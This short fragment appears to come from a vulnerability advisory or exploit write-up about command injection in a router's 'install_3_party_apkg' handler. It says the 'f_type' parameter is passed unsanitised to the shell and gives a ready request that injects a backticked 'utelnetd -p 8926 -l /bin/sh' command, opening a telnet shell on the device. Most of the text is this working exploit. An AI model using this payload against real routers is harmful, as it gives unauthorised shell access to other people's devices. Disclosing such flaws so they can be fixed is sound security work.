...
In `install_3_party_apkg` function, `f_type` is directly passed by the attacker, so we can control the `f_type` to attack the OS.
...
We set `f_type` as **`utelnetd -p 8926 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=install_3_party_apkg&f_type=`utelnetd -p 8926 -l /bin/sh`&install_type=
```
